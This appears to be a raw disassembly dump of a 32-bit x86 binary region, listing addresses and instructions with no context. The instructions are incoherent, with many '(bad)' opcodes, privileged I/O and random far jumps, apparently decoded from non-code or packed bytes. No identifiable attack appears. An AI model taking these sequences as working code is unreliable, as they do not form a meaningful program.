  4a8de2:	test   BYTE PTR [ebx-0x33ff5f9c],dh
  4a8de8:	dec    eax
  4a8de9:	or     al,0xae
  4a8deb:	mov    al,ds:0x580305a8
  4a8df0:	cmp    ah,BYTE PTR [eax-0x577eeece]
  4a8df6:	push   ebp
  4a8df7:	mov    eax,0xe3fdf293
  4a8dfc:	ins    DWORD PTR es:[edi],dx
  4a8dfd:	sub    ecx,DWORD PTR [edx]
  4a8dff:	es inc edi
  4a8e01:	inc    esi
  4a8e02:	ja     0x4a8e34
  4a8e04:	xor    DWORD PTR [edi+0xc],ecx
  4a8e07:	in     eax,0x8a
  4a8e09:	or     al,0xa5
  4a8e0b:	fiadd  DWORD PTR [edi+0x65fb8b18]
  4a8e11:	jmp    0x7ca9:0x38bf06a0
  4a8e18:	dec    ebx
  4a8e19:	rol    DWORD PTR [ebx],cl
  4a8e1b:	adc    al,0xe
  4a8e1d:	ror    ah,1
  4a8e1f:	stos   DWORD PTR es:[edi],eax
  4a8e20:	mov    edi,0x1b042c21
  4a8e25:	cmp    DWORD PTR [ebx+0x1275fcb7],0x4
  4a8e2c:	pop    edx
  4a8e2d:	xchg   BYTE PTR [ebx+0x416a08b],cl
  4a8e33:	pop    esi
  4a8e34:	lods   al,BYTE PTR ds:[esi]
  4a8e35:	dec    esi
  4a8e36:	or     BYTE PTR [ebp+esi*2+0x53],ch
  4a8e3a:	mov    esi,0x10c7544c
  4a8e3f:	enter  0x2557,0xdc
  4a8e43:	pop    ss
  4a8e44:	mov    eax,0x14510b40
  4a8e49:	cmc    
  4a8e4a:	out    dx,al
  4a8e4b:	sbb    BYTE PTR ds:0x87630818,bl
  4a8e51:	mov    dl,0x91
  4a8e53:	js     0x4a8def
  4a8e55:	pop    edx
  4a8e56:	bound  eax,QWORD PTR [edx-0x36]
  4a8e59:	jle    0x4a8e64
  4a8e5b:	and    ebp,eax
  4a8e5d:	xor    DWORD PTR [edi+0x822750e],0x86bc28e1
  4a8e67:	add    BYTE PTR [ebp+0x5e68c2b4],dh
  4a8e6d:	(bad)  
  4a8e6e:	mov    WORD PTR [ebx+0x17],cs
  4a8e71:	(bad)  
  4a8e72:	stos   DWORD PTR es:[edi],eax
  4a8e73:	or     eax,0xece0867d
  4a8e78:	in     eax,dx
  4a8e79:	into   
  4a8e7a:	sbb    eax,DWORD PTR [eax]
  4a8e7c:	mov    bl,0x80
  4a8e7e:	daa    
  4a8e7f:	imul   edx,edx,0x70d21350
  4a8e85:	out    0x10,eax
  4a8e87:	test   eax,0x8b110775
  4a8e8c:	mov    BYTE PTR [ecx+edx*8+0x52518bf],0x60
  4a8e94:	sahf   
  4a8e95:	ret    0xbe7d
  4a8e98:	jmp    0x4a8ec3
  4a8e9a:	or     BYTE PTR [ebp+0x1c],bh
  4a8e9d:	sbb    BYTE PTR [esi+0x1a],0x69
  4a8ea1:	out    0x9b,eax
  4a8ea3:	sahf   
  4a8ea4:	push   eax
  4a8ea5:	push   0x1
  4a8ea7:	push   edi
  4a8ea8:	push   ecx
  4a8ea9:	call   0xa970:0xa7ba1b7c
  4a8eb0:	push   esp
  4a8eb1:	mov    esi,0xa0264013
  4a8eb6:	inc    ebx
  4a8eb7:	xchg   BYTE PTR [ebx],cl
  4a8eb9:	imul   ebx,DWORD PTR [esp+ebx*1],0xf91816a0
  4a8ec0:	cmp    eax,0xbe0e1434
  4a8ec5:	push   es
  4a8ec6:	xchg   ebp,eax
  4a8ec7:	pusha  
  4a8ec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a8ec9:	outs   dx,BYTE PTR ds:[esi]
  4a8eca:	xor    al,0x8b
  4a8ecc:	xchg   DWORD PTR [ecx],ecx
  4a8ece:	or     al,0xc1
  4a8ed0:	sbb    eax,0xfab6ba7a
  4a8ed5:	imul   ecx,edi,0x62310309
  4a8edb:	daa    
  4a8edc:	push   ds
  4a8edd:	cmp    al,0xec
  4a8edf:	jo     0x4a8ee6
  4a8ee1:	fidivr WORD PTR [edi]
  4a8ee3:	dec    edi
  4a8ee4:	inc    ebx
  4a8ee5:	(bad)  
  4a8ee6:	jbe    0x4a8e99
  4a8ee8:	or     DWORD PTR [edi],edx
  4a8eea:	inc    esp
  4a8eeb:	adc    DWORD PTR [esi-0x73],0x18
  4a8eef:	fs push 0x78
  4a8ef2:	xchg   ch,al
  4a8ef4:	adc    al,0x38
  4a8ef6:	mov    ebx,0x34f3cf53
  4a8efb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a8efc:	or     al,0x74
  4a8efe:	push   ebx
  4a8eff:	rcl    BYTE PTR [esi-0x2c],1
  4a8f02:	dec    ecx
  4a8f03:	jae    0x4a8f78
  4a8f05:	and    BYTE PTR [ebx+0x4b4389e4],ah
  4a8f0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a8f0c:	push   cs
  4a8f0d:	and    BYTE PTR [edx+0x61],ch
  4a8f10:	loope  0x4a8ea0
  4a8f12:	dec    ebp
  4a8f13:	cmp    al,0xcd
  4a8f15:	or     DWORD PTR [edi+0x411d47d],0xffffffa7
  4a8f1c:	loop   0x4a8ed4
  4a8f1e:	add    esi,ecx
  4a8f20:	push   ebx
  4a8f21:	fst    DWORD PTR [eax+0x64]
  4a8f24:	bound  esp,QWORD PTR [eax]
  4a8f26:	xchg   esp,eax
  4a8f27:	push   ss
  4a8f28:	inc    ecx
  4a8f29:	sub    eax,0x66850224
  4a8f2e:	dec    edx
  4a8f2f:	shl    DWORD PTR [edx+0xf8aa1e1],0x51
  4a8f36:	mov    dh,0xb7
  4a8f38:	add    BYTE PTR [ecx+0x18635471],bl
  4a8f3e:	(bad)  
  4a8f3f:	sub    BYTE PTR [eax+eiz*8],bl
  4a8f42:	dec    esp
  4a8f43:	dec    ebp
  4a8f44:	xchg   esi,eax
  4a8f45:	mov    edx,0xc7be96cb
  4a8f4a:	retf   
  4a8f4b:	sub    BYTE PTR [ebx+0x79a84264],cl
  4a8f51:	push   0xed0963b5
  4a8f56:	inc    edx
  4a8f57:	adc    DWORD PTR [esi+0x24],eax
  4a8f5a:	sar    ebx,1
  4a8f5c:	aaa    
  4a8f5d:	ins    BYTE PTR es:[edi],dx
  4a8f5e:	add    bl,0x7c
  4a8f61:	outs   dx,BYTE PTR ds:[esi]
  4a8f62:	mov    esp,0x888e8a32
  4a8f67:	std    
  4a8f68:	ins    DWORD PTR es:[edi],dx
  4a8f69:	jmp    0x71d0ff6
  4a8f6e:	pop    es
  4a8f6f:	xchg   ah,dl
  4a8f71:	cmp    al,0xa3
  4a8f73:	dec    esi
  4a8f74:	pop    ss
  4a8f75:	dec    esp
  4a8f76:	add    BYTE PTR [eax],ah
  4a8f78:	call   0x71db:0xdba6012f
  4a8f7f:	fiadd  WORD PTR [eax-0x2d24f5fd]
  4a8f85:	repz xchg bl,al
  4a8f88:	cmp    dl,BYTE PTR [esp+edx*2]
  4a8f8b:	mov    eax,cs
  4a8f8d:	dec    ebp
  4a8f8e:	dec    ebx
  4a8f8f:	jo     0x4a8f95
  4a8f91:	add    ah,BYTE PTR [edi-0x3dfc78ff]
  4a8f97:	out    0x14,eax
  4a8f99:	fdivr  DWORD PTR [edx+0x6a]
  4a8f9c:	adc    eax,ebx
  4a8f9e:	or     BYTE PTR [ebx-0x72],bl
  4a8fa1:	std    
  4a8fa2:	push   eax
  4a8fa3:	dec    ebp
  4a8fa4:	fs inc edx
  4a8fa6:	add    BYTE PTR [ebx+0x3e],dh
  4a8fa9:	mov    dl,0xfc
  4a8fab:	sub    bh,BYTE PTR [ebx-0x15]
  4a8fae:	mov    ebx,0x870f11bc
  4a8fb3:	push   esp
  4a8fb4:	add    eax,DWORD PTR [ebx]
  4a8fb6:	push   eax
  4a8fb7:	lea    esp,[eax+edx*1]
  4a8fba:	loope  0x4a8fcc
  4a8fbc:	in     al,dx
  4a8fbd:	or     al,0xca
  4a8fbf:	dec    edx
  4a8fc0:	fadd   DWORD PTR [eax+0x30eea768]
  4a8fc6:	adc    BYTE PTR [ebx],al
  4a8fc8:	sbb    eax,0xdd9e94fd
  4a8fcd:	mov    ecx,0x247bacbd
  4a8fd2:	xor    esp,DWORD PTR [ecx]
  4a8fd4:	cli    
  4a8fd5:	les    edi,FWORD PTR [edi]
  4a8fd7:	sub    DWORD PTR [edi-0x6b],0xb84b0910
  4a8fde:	nop
  4a8fdf:	ret    0xa3a5
  4a8fe2:	mov    DWORD PTR ds:0x6021bff5,0x1fd170c1
  4a8fec:	push   ds
  4a8fed:	dec    esp
  4a8fee:	jge    0x4a9050
  4a8ff0:	(bad)  
  4a8ff1:	mov    ecx,DWORD PTR [ecx]
  4a8ff3:	cmp    dl,ch
  4a8ff5:	and    BYTE PTR [ebx],bh
  4a8ff7:	push   edi
  4a8ff8:	jg     0x4a902d
  4a8ffa:	inc    edi
  4a8ffb:	pop    ds
  4a8ffc:	ss mov ecx,0x2c03ea88
  4a9002:	cmp    ecx,DWORD PTR [esi+0x30]
  4a9005:	je     0x4a9015
  4a9007:	inc    eax
  4a9008:	cmp    ebp,ecx
  4a900a:	imul   ebp,eax,0xcb7e737e
  4a9010:	xchg   edi,eax
  4a9011:	sub    al,0x26
  4a9013:	mov    al,BYTE PTR [ebp+ebp*1-0x7ffd518]
  4a901a:	lods   al,BYTE PTR ds:[esi]
  4a901b:	nop
  4a901c:	arpl   WORD PTR [esi-0x587b290],dx
  4a9022:	mov    ds:0x8dca2910,eax
  4a9027:	inc    ecx
  4a9028:	lea    eax,[eax]
  4a902a:	scas   eax,DWORD PTR es:[edi]
  4a902b:	cmp    ah,dl
  4a902d:	ror    ebp,cl
  4a902f:	inc    ebp
  4a9030:	ins    DWORD PTR es:[edi],dx
  4a9031:	push   edx
  4a9032:	and    dl,BYTE PTR [edi]
  4a9034:	and    ebp,0x9f783096
  4a903a:	mov    esi,0x50837e6d
  4a903f:	ret    0xcff1
  4a9042:	test   bl,0x86
  4a9045:	or     BYTE PTR [ebx+0x3849b2f3],0x20
  4a904c:	and    al,0x9c
  4a904e:	dec    ebp
  4a904f:	push   0xffffffc2
  4a9051:	push   ecx
  4a9052:	inc    edx
  4a9053:	and    eax,0x11772b00
  4a9058:	rcl    BYTE PTR [ecx-0x6e762968],cl
  4a905e:	xchg   esp,eax
  4a905f:	stc    
  4a9060:	push   edi
  4a9061:	shl    DWORD PTR [esi],1
  4a9063:	or     BYTE PTR es:[edi-0x3fb607bb],dl
  4a906a:	sbb    eax,0xc6f94138
  4a906f:	gs dec ebx
  4a9071:	dec    edi
  4a9072:	xor    BYTE PTR [ebx+edi*4+0x6d],dl
  4a9076:	sub    al,0x6
  4a9078:	lock or al,0xc3
  4a907b:	push   0xdc90c0be
  4a9080:	lds    esp,FWORD PTR [ebx]
  4a9082:	push   edi
  4a9083:	xchg   edx,eax
  4a9084:	add    eax,0xc5e77e09
  4a9089:	sar    DWORD PTR [esi+0xe085816],1
  4a908f:	fs adc al,dh
  4a9092:	add    BYTE PTR [eax],bh
  4a9094:	pop    ss
  4a9095:	das    
  4a9096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a9097:	pusha  
  4a9098:	jl     0x4a909c
  4a909a:	jl     0x4a903d
  4a909c:	mov    ecx,0x1d104246
  4a90a1:	jl     0x4a90d3
  4a90a3:	adc    ebx,DWORD PTR [edx-0x6c]
  4a90a6:	xor    ecx,DWORD PTR [ecx]
  4a90a8:	ret    
  4a90a9:	mov    WORD PTR [edx+0x5e],?
  4a90ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a90ad:	xor    BYTE PTR [edi],bh
  4a90af:	xlat   BYTE PTR ds:[ebx]
  4a90b0:	dec    esp
  4a90b1:	add    al,0x11
  4a90b3:	(bad)  
  4a90b4:	cdq    
  4a90b5:	ja     0x4a90b7
  4a90b7:	loopne 0x4a9093
  4a90b9:	outs   dx,BYTE PTR ds:[esi]
  4a90ba:	add    dh,BYTE PTR [eax]
  4a90bc:	push   ecx
  4a90bd:	outs   dx,DWORD PTR ds:[esi]
  4a90be:	xor    BYTE PTR [ebx],dh
  4a90c0:	and    bh,dl
  4a90c2:	jp     0x4a90da
  4a90c4:	jbe    0x4a9118
  4a90c6:	and    DWORD PTR [eax],0x1595488d
  4a90cc:	in     al,0x76
  4a90ce:	out    0x90,eax
  4a90d0:	mov    ds:0x9a360c4e,eax
  4a90d5:	or     DWORD PTR [eax+0xb],ebp
  4a90d8:	add    DWORD PTR [ecx+ebp*2+0x45ae6b41],ebx
  4a90df:	ins    BYTE PTR es:[edi],dx
  4a90e0:	stc    
  4a90e1:	jbe    0x4a90fc
  4a90e3:	rcl    BYTE PTR [ecx+0x6b],cl
  4a90e6:	push   cs
  4a90e7:	cmp    BYTE PTR [eax],dh
  4a90e9:	xchg   edx,eax
  4a90ea:	mov    dl,0x35
  4a90ec:	sbb    eax,0xc0d3013c
  4a90f1:	mov    bh,0x36
  4a90f3:	fs js  0x4a9088
  4a90f6:	pusha  
  4a90f7:	push   esi
  4a90f8:	adc    BYTE PTR [ebp+0x32],ch
  4a90fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a90fc:	mov    ds:0x99083284,al
  4a9101:	cmp    ch,BYTE PTR [eax-0x21]
  4a9104:	sub    BYTE PTR [eax],0x6
  4a9107:	dec    esp
  4a9108:	sbb    BYTE PTR [eax],cl
  4a910a:	adc    eax,0x909ee68c
  4a910f:	push   cs
  4a9110:	push   ss
  4a9111:	xor    BYTE PTR [ecx],0x40
  4a9114:	xor    al,0xba
  4a9116:	enter  0xa066,0x32
  4a911a:	ds add al,0x75
  4a911d:	loopne 0x4a90f2
  4a911f:	push   ds
  4a9120:	(bad)  
  4a9121:	push   ss
  4a9122:	xchg   esi,eax
  4a9123:	jmp    0x9d0ad54c
  4a9128:	rol    bl,0xd6
  4a912b:	xchg   BYTE PTR [ecx],cl
  4a912d:	inc    ebp
  4a912e:	test   eax,0x2f83547b
  4a9133:	rcr    DWORD PTR [eax],cl
  4a9135:	neg    DWORD PTR [edx+0xd01780c]
  4a913b:	jns    0x4a914b
  4a913d:	adc    dl,ah
  4a913f:	aad    0x9d
  4a9141:	add    al,0x2e
  4a9143:	xchg   edx,eax
  4a9144:	js     0x4a918f
  4a9146:	or     BYTE PTR [ecx+0x55],ch
  4a9149:	push   0x77
  4a914b:	jnp    0x4a9138
  4a914d:	jbe    0x4a90e2
  4a914f:	jbe    0x4a9121
  4a9151:	sub    al,0x2
  4a9153:	pop    ebx
  4a9154:	add    bl,BYTE PTR [ebp+0x19]
  4a9157:	retf   
  4a9158:	push   eax
  4a9159:	and    esp,esp
  4a915b:	(bad)  
  4a915c:	jle    0x4a918e
  4a915e:	stos   DWORD PTR es:[edi],eax
  4a915f:	dec    edi
  4a9160:	sbb    eax,0x42eb39ba
  4a9165:	ret    
  4a9166:	add    DWORD PTR [edx-0x72],0xffffff9f
  4a916a:	xchg   eax,ebp
  4a916c:	mov    dh,BYTE PTR ds:0x61167448
  4a9172:	popf   
  4a9173:	ficom  WORD PTR [ecx-0x149c5cbd]
  4a9179:	sbb    eax,ecx
  4a917b:	push   0x8db6953
  4a9180:	(bad)  
  4a9181:	cld    
  4a9182:	push   0x3c1ba965
  4a9187:	dec    esp
  4a9188:	imul   ebx,DWORD PTR [ecx+ecx*8],0xffffff81
  4a918c:	jecxz  0x4a9186
  4a918e:	inc    esp
  4a918f:	sahf   
  4a9190:	cmp    dh,BYTE PTR [ebp+0x46592b04]
  4a9196:	and    bl,al
  4a9198:	adc    eax,0x1ce43aa6
  4a919d:	xchg   BYTE PTR [edi],bh
  4a919f:	xor    bh,BYTE PTR [ecx+0x12]
  4a91a2:	and    BYTE PTR [ecx-0x44d9c3c2],dl
  4a91a8:	shl    BYTE PTR [ebp-0x5b7b02e0],0x39
  4a91af:	sub    BYTE PTR [eax],cl
  4a91b1:	sub    al,BYTE PTR [ecx]
  4a91b3:	nop
  4a91b4:	test   DWORD PTR [edi],eax
  4a91b6:	add    eax,0x4b194e8
  4a91bb:	cmp    al,0xfa
  4a91bd:	ret    
  4a91be:	xor    BYTE PTR [ecx],cl
  4a91c0:	test   DWORD PTR [ebx],ebp
  4a91c2:	test   eax,0x9c1b3eb7
  4a91c7:	push   es
  4a91c8:	add    ebx,0xea4adfe9
  4a91ce:	cld    
  4a91cf:	cdq    
  4a91d0:	sbb    esi,esi
  4a91d2:	shl    DWORD PTR [edx],cl
  4a91d4:	sahf   
  4a91d5:	clc    
  4a91d6:	pop    esi
  4a91d7:	dec    ebx
  4a91d8:	fsubr  DWORD PTR [ebp+0xa]
  4a91db:	fsubr  DWORD PTR [ecx+0x383c1b88]
  4a91e1:	and    eax,0xbb16848c
  4a91e6:	push   esi
  4a91e7:	(bad)  
  4a91e8:	jne    0x4a920f
  4a91ea:	pop    ebp
  4a91eb:	dec    ebx
  4a91ec:	ret    0x7ec1
  4a91ef:	call   FWORD PTR [edi]
  4a91f1:	sbb    ch,ah
  4a91f3:	xchg   BYTE PTR [ebp+ebx*1-0x162d861c],ch
  4a91fa:	push   DWORD PTR [ebx-0x3f]
  4a91fd:	inc    esi
  4a91fe:	mov    dl,bl
  4a9200:	ja     0x4a923e
  4a9202:	push   ss
  4a9203:	lock sub eax,0x1780cde1
  4a9209:	sbb    dh,BYTE PTR [ebp+0x12]
  4a920c:	jae    0x4a9281
  4a920e:	popa   
  4a920f:	test   BYTE PTR [eax+0x36],dl
  4a9212:	or     ebp,ebp
  4a9214:	xchg   ebx,eax
  4a9215:	sbb    BYTE PTR [eax],al
  4a9217:	dec    edi
  4a9218:	sbb    DWORD PTR [edx+0x56],esp
  4a921b:	push   ecx
  4a921c:	cdq    
  4a921d:	inc    esp
  4a921e:	sbb    al,0x35
  4a9220:	ret    
  4a9221:	(bad)  
  4a9222:	(bad)  
  4a9223:	xor    ah,BYTE PTR [ebx+0x66]
  4a9226:	ss jbe 0x4a923a
  4a9229:	ret    0xbd7b
  4a922c:	sbb    cl,BYTE PTR [ebx+0x303b3076]
  4a9232:	mov    fs,WORD PTR [ebx]
  4a9234:	push   ds
  4a9235:	pusha  
  4a9236:	push   ebx
  4a9237:	pop    esp
  4a9238:	retf   
  4a9239:	xor    al,0x81
  4a923b:	pop    edi
  4a923c:	es in  eax,dx
  4a923e:	add    ecx,esp
  4a9240:	test   al,0xc
  4a9242:	and    edx,DWORD PTR [edi-0x6b]
  4a9245:	sti    
  4a9246:	add    al,0xa7
  4a9248:	loopne 0x4a91fa
  4a924a:	jl     0x4a91fc
  4a924c:	and    esi,DWORD PTR [edi]
  4a924e:	xor    DWORD PTR [edi],0x512e8e50
  4a9254:	and    esi,eax
  4a9256:	xchg   ebx,eax
  4a9257:	cmp    BYTE PTR [eax],dh
  4a9259:	or     BYTE PTR [ebx+0xb1dc609],al
  4a925f:	mov    ah,0xac
  4a9261:	add    eax,0x26613474
  4a9266:	pop    es
  4a9267:	js     0x4a92e8
  4a9269:	std    
  4a926a:	aam    0xf8
  4a926c:	in     al,dx
  4a926d:	rcr    DWORD PTR [esi+0x4c68bd04],cl
  4a9273:	jecxz  0x4a9295
  4a9275:	fstp   QWORD PTR [esi-0x36]
  4a9278:	data16 mov dl,0x56
  4a927b:	int    0x44
  4a927d:	rol    eax,0x2d
  4a9280:	test   BYTE PTR ds:0xc021423e,dl
  4a9286:	ret    0x20d6
  4a9289:	hlt    
  4a928a:	push   ss
  4a928b:	arpl   WORD PTR [eax+0x34],dx
  4a928e:	stos   DWORD PTR es:[edi],eax
  4a928f:	add    BYTE PTR [eax],ch
  4a9291:	mov    bh,0x99
  4a9293:	ret    
  4a9294:	pop    ds
  4a9295:	jmp    0x4a9287
  4a9297:	sbb    eax,0x6791f290
  4a929c:	cdq    
  4a929d:	add    esi,DWORD PTR [esi+0x53460a7f]
  4a92a3:	icebp  
  4a92a4:	jmp    esi
  4a92a6:	mov    al,BYTE PTR [eax+eax*1-0x22]
  4a92aa:	mov    BYTE PTR [esi],al
  4a92ac:	cmp    al,BYTE PTR [edi+0x6cd3ed3d]
  4a92b2:	fisttp QWORD PTR [ecx+0x268c3c27]
  4a92b8:	sub    dh,BYTE PTR [edx-0x1863aba8]
  4a92be:	ss add al,0xea
  4a92c1:	mov    WORD PTR [edx+edi*1+0x66],es
  4a92c5:	or     dh,BYTE PTR [edi]
  4a92c7:	push   ebx
  4a92c8:	xor    al,0x3
  4a92ca:	add    ecx,DWORD PTR [edx]
  4a92cc:	or     cl,BYTE PTR [esi+0x5f0b224]
  4a92d2:	or     al,BYTE PTR [esi]
  4a92d4:	or     bl,ah
  4a92d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a92d7:	inc    eax
  4a92d8:	jmp    0xdc4d:0x6007369b
  4a92df:	pop    eax
  4a92e0:	jae    0x4a9351
  4a92e2:	retf   
  4a92e3:	mov    eax,0x6d29082e
  4a92e8:	jecxz  0x4a92e2
  4a92ea:	jle    0x4a926e
  4a92ec:	sbb    DWORD PTR [edi],ecx
  4a92ee:	sbb    DWORD PTR [esi-0x6c],ebp
  4a92f1:	xor    BYTE PTR [edx-0x57e76c62],cl
  4a92f7:	cmp    ecx,0xcba9603e
  4a92fd:	fwait
  4a92fe:	add    dl,0xcd
  4a9301:	push   edx
  4a9302:	inc    esp
  4a9303:	dec    edx
  4a9304:	mov    cl,0x97
  4a9306:	pop    edx
  4a9307:	add    DWORD PTR [eax-0x27],edi
  4a930a:	add    esp,DWORD PTR [esi-0x70497c08]
  4a9310:	aaa    
  4a9311:	dec    esp
  4a9312:	sbb    ecx,DWORD PTR [edi]
  4a9314:	xchg   DWORD PTR [ecx+edx*1-0x6a],edi
  4a9318:	pop    DWORD PTR [esi+esi*2+0x12]
  4a931c:	pop    ecx
  4a931d:	add    DWORD PTR [ebp-0xeec9d60],0x3e
  4a9324:	dec    ebp
  4a9325:	dec    ebp
  4a9326:	rcl    dh,1
  4a9328:	pop    edi
  4a9329:	cmp    ebx,0x8259fe96
  4a932f:	push   cs
  4a9330:	and    BYTE PTR [edx-0x3e],dh
  4a9333:	or     ebp,DWORD PTR [ebx-0x60]
  4a9336:	dec    esi
  4a9337:	inc    esp
  4a9338:	inc    edi
  4a9339:	mov    al,ds:0xa30b277f
  4a933e:	icebp  
  4a933f:	push   ecx
  4a9340:	les    eax,FWORD PTR [ecx]
  4a9342:	adc    cl,bl
  4a9344:	sbb    eax,0xa491387c
  4a9349:	cmp    dh,BYTE PTR es:[eax+edx*2]
  4a934d:	daa    
  4a934e:	inc    edx
  4a934f:	test   DWORD PTR [edi+0x5becbc5d],esi
  4a9355:	jb     0x4a9392
  4a9357:	sbb    esp,edx
  4a9359:	xchg   edx,eax
  4a935a:	push   eax
  4a935b:	mov    DWORD PTR [esi+0x35],eax
  4a935e:	inc    ebx
  4a935f:	mov    edx,0x50ce6163
  4a9364:	test   eax,0x64f20120
  4a9369:	pusha  
  4a936a:	cmp    eax,0xb0111dd3
  4a936f:	push   ss
  4a9370:	sbb    ah,ch
  4a9372:	mov    ah,0x0
  4a9374:	mov    cl,0x6
  4a9376:	pop    esp
  4a9377:	adc    al,0x70
  4a9379:	or     al,0x97
  4a937b:	jmp    0x4a9327
  4a937d:	mov    esi,ebp
  4a937f:	mov    cl,0xd2
  4a9381:	inc    esp
  4a9382:	xchg   ecx,eax
  4a9383:	lock push edi
  4a9385:	imul   edx,DWORD PTR [esi+0xb],0x60561850
  4a938c:	jle    0x4a93a7
  4a938e:	fsub   DWORD PTR [edi+esi*4]
  4a9391:	cld    
  4a9392:	pop    ds
  4a9393:	adc    bl,BYTE PTR [esi+0x1a]
  4a9396:	jno    0x4a93ea
  4a9398:	jmp    0x4a93d3
  4a939a:	sub    edi,DWORD PTR [eax+0x7cdac289]
  4a93a0:	pop    edx
  4a93a1:	mov    bl,0x83
  4a93a3:	sbb    eax,0x19753a04
  4a93a8:	cmp    bh,BYTE PTR ds:0x61a76a69
  4a93ae:	rol    BYTE PTR [edi-0x3fa9595],0x68
  4a93b5:	dec    esp
  4a93b6:	adc    BYTE PTR [esi-0x6f3ae6f4],bh
  4a93bc:	jbe    0x4a93d0
  4a93be:	stos   BYTE PTR es:[edi],al
  4a93bf:	xchg   edx,eax
  4a93c0:	push   cs
  4a93c1:	or     BYTE PTR [ebp+0x2b],dh
  4a93c4:	add    dh,al
  4a93c6:	mov    cl,0x1c
  4a93c8:	inc    edi
  4a93c9:	stos   DWORD PTR es:[edi],eax
  4a93ca:	xchg   ebp,eax
  4a93cb:	inc    eax
  4a93cc:	add    cl,BYTE PTR [ecx]
  4a93ce:	lds    edx,FWORD PTR [ebp-0x71650862]
  4a93d4:	push   edx
  4a93d5:	mov    ds,ecx
  4a93d7:	push   es
  4a93d8:	push   edi
  4a93d9:	push   cs
  4a93da:	jbe    0x4a9371
  4a93dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a93dd:	dec    edi
  4a93de:	repz jns 0x4a93d3
  4a93e1:	jmp    0x8f9f4f73
  4a93e6:	inc    eax
  4a93e7:	inc    ebp
  4a93e8:	ss out dx,eax
  4a93ea:	scas   al,BYTE PTR es:[edi]
  4a93eb:	add    BYTE PTR [eax],cl
  4a93ed:	add    cl,BYTE PTR [eax]
  4a93ef:	or     esp,DWORD PTR [esi]
  4a93f1:	fldenv [ecx-0x45f3fb66]
  4a93f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a93f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a93f9:	jecxz  0x4a9401
  4a93fb:	sbb    eax,0xdcfc7408
  4a9400:	mov    eax,ds:0xd17e696c
  4a9405:	in     eax,dx
  4a9406:	or     BYTE PTR [eax-0x2d],al
  4a9409:	cld    
  4a940a:	mov    cl,0x77
  4a940c:	mov    ecx,DWORD PTR [ebp+0xc]
  4a940f:	adc    DWORD PTR [edx],esi
  4a9411:	mov    al,0xd5
  4a9413:	or     edx,DWORD PTR [esi+0x5896675]
  4a9419:	push   ss
  4a941a:	sub    al,BYTE PTR [edx+ecx*4+0x6c4820e8]
  4a9421:	jbe    0x4a93d3
  4a9423:	xor    al,0x1a
  4a9425:	sub    al,BYTE PTR [ecx]
  4a9427:	ja     0x4a93b2
  4a9429:	pop    es
  4a942a:	nop
  4a942b:	inc    edi
  4a942c:	pop    ebx
  4a942d:	aad    0x51
  4a942f:	cld    
  4a9430:	inc    BYTE PTR [eax]
  4a9432:	mov    ah,0xc
  4a9434:	xor    ah,BYTE PTR ds:0x647408fc
  4a943a:	xchg   esp,eax
  4a943b:	dec    eax
  4a943c:	inc    esp
  4a943d:	push   ebp
  4a943e:	push   ecx
  4a943f:	dec    ebx
  4a9440:	lock repnz shr DWORD PTR [eax+0x2a],1
  4a9445:	dec    edx
  4a9446:	xor    DWORD PTR [edi+0x1e915900],edi
  4a944c:	(bad)  
  4a944d:	mov    ch,0xb2
  4a944f:	int    0x3d
  4a9451:	or     al,0x42
  4a9453:	pop    edi
  4a9454:	or     DWORD PTR [ecx+0x3e],0xffffffca
  4a9458:	and    al,0xeb
  4a945a:	pop    ebx
  4a945b:	push   ecx
  4a945c:	or     DWORD PTR es:[edi+ebx*4],eax
  4a9460:	xchg   ebp,eax
  4a9461:	test   eax,0x1e26af24
  4a9466:	adc    eax,edi
  4a9468:	mov    eax,0x1e3e24c7
  4a946d:	jl     0x4a9494
  4a946f:	and    al,0x38
  4a9471:	out    dx,al
  4a9472:	test   al,0x90
  4a9474:	dec    eax
  4a9475:	sub    ebp,DWORD PTR [eax]
  4a9477:	sbb    esi,ecx
  4a9479:	jno    0x4a941e
  4a947b:	sbb    ebp,DWORD PTR [eax-0x7c]
  4a947e:	jge    0x4a9409
  4a9480:	push   esi
  4a9481:	dec    eax
  4a9482:	adc    DWORD PTR [esi-0x6f],esp
  4a9485:	test   BYTE PTR [ebx-0x65],al
  4a9488:	and    BYTE PTR [eax+0x16800fd0],al
  4a948e:	push   eax
  4a948f:	xor    al,0xb7
  4a9491:	or     cl,BYTE PTR [eax]
  4a9493:	sbb    dh,BYTE PTR [ebp+eax*1+0x19]
  4a9497:	mov    bh,0x79
  4a9499:	add    DWORD PTR cs:[ebx-0x736f18d0],edi
  4a94a0:	push   es
  4a94a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a94a2:	iret   
  4a94a3:	jl     0x4a9443
  4a94a5:	out    0xbb,eax
  4a94a7:	jg     0x4a947a
  4a94a9:	xor    BYTE PTR [ecx+0x238a6d01],dl
  4a94af:	fwait
  4a94b0:	push   es
  4a94b1:	add    DWORD PTR [esi],eax
  4a94b3:	add    al,BYTE PTR [ebx]
  4a94b5:	mov    ds:0xde000604,al
  4a94ba:	adc    BYTE PTR [esi],cl
  4a94bc:	or     ecx,DWORD PTR [esi+0x5f8827ce]
  4a94c2:	imul   ecx,DWORD PTR [edi+ecx*4],0xffffff83
  4a94c6:	cmp    dh,bh
  4a94c8:	(bad)  
  4a94c9:	or     esi,DWORD PTR [ecx+0x58bb2470]
  4a94cf:	pop    ss
  4a94d0:	(bad)  [eax+ebx*4-0x7f270108]
  4a94d7:	jg     0x4a9541
  4a94d9:	hlt    
  4a94da:	mov    BYTE PTR [edi-0x7a],0x81
  4a94de:	into   
  4a94df:	cmp    edi,DWORD PTR [ecx-0x58]
  4a94e2:	dec    ebp
  4a94e3:	nop
  4a94e4:	and    ebp,DWORD PTR [edx]
  4a94e6:	or     BYTE PTR [ecx],ah
  4a94e8:	(bad)  
  4a94e9:	rcl    BYTE PTR [ecx],0x35
  4a94ec:	xchg   ebp,eax
  4a94ed:	mov    edx,0x21519357
  4a94f2:	in     eax,0x89
  4a94f4:	inc    ebp
  4a94f5:	in     al,dx
